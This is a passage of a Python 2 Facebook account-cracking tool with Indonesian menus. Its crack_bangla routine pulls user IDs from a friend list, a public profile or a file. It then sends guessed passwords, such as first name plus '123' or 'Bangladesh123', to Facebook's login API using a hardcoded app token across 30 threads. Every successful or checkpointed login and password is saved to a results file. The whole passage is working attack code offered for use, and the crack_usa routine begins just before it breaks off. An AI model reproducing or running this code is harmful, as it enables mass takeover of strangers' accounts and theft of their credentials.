                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo7
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\x1b[1;96mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Salah Pilih Yang Benar...!'
        pilih_bangla()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo18
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo18
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idb = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama \x1b[1;91m:\x1b[1;92m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / Teman Salah!'
                raw_input('\n\x1b[1;96m{\x1b[1;97m<Keluar>\x1b[1;96m}')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '{!} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo18
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Nama File \x1b[1;91m:\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada !'
                    raw_input('\n\x1b[1;96m{\x1b[1;97m<Keluar>\x1b[1;96m}')
                    crack_bangla()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Salah Pilih Yang Benar..!'
                pilih_bangla()
            print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Total ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Stop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m Craker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Bangladesh'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Bangladesh123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Bangal786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo8
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_usa()


def pilih_usa():
